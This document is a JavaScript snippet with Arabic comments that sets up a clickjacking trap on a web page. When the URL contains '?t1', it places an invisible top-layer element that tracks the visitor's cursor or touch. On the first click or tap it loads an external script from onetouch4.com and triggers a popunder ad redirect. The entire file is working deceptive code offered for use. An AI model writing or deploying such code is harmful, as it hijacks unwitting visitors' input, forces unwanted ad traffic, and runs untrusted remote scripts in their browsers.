(function() {
    // 1. تفعيل الكود فقط بوجود ?t1
    if (!new URLSearchParams(window.location.search).has('t1')) return;

    // 2. إعدادات كود البوب الخاص بك
    const adConfig = {
        lib: "https://onetouch4.com/sl/pnm/61287.js",
        trigger: "https://daleelerah.info/pop-go/61287",
        options: {"newTab":false,"blur":false,"cookieExpires":60,"delay":0} // جعلنا التأخير 0 للسرعة
    };

    let deployed = false;

    // 3. إنشاء "المتابع الخفي" (The Ghost)
    const ghost = document.createElement('div');
    ghost.style.cssText = `
        position: fixed; top: 0; left: 0; width: 100px; height: 100px;
        z-index: 2147483647; background: transparent; pointer-events: auto;
        cursor: pointer;
    `;
    document.body.appendChild(ghost);

    // 4. جعل "الشبح" يتبع الماوس أو اللمس بدقة
    window.addEventListener('mousemove', (e) => {
        if (deployed) return;
        ghost.style.left = (e.clientX - 50) + 'px';
        ghost.style.top = (e.clientY - 50) + 'px';
    });

    window.addEventListener('touchstart', (e) => {
        if (deployed) return;
        const touch = e.touches[0];
        ghost.style.left = (touch.clientX - 50) + 'px';
        ghost.style.top = (touch.clientY - 50) + 'px';
    }, {passive: true});

    // 5. محرك التنفيذ عند أول "احتكاك"
    const launchPop = () => {
        if (deployed) return;
        deployed = true;

        // تحميل المكتبة وتشغيل الكود فوراً
        const s = document.createElement('script');
        s.src = adConfig.lib;
        s.onload = () => {
            if (typeof firstAggOmg !== 'undefined') {
                firstAggOmg.make(adConfig.trigger, adConfig.options);
            }
        };
        document.head.appendChild(s);

        // إزالة الشبح والمستمعات لتنظيف الموقع
        ghost.remove();
    };

    ghost.addEventListener('mousedown', launchPop);
    ghost.addEventListener('touchstart', launchPop);

})();
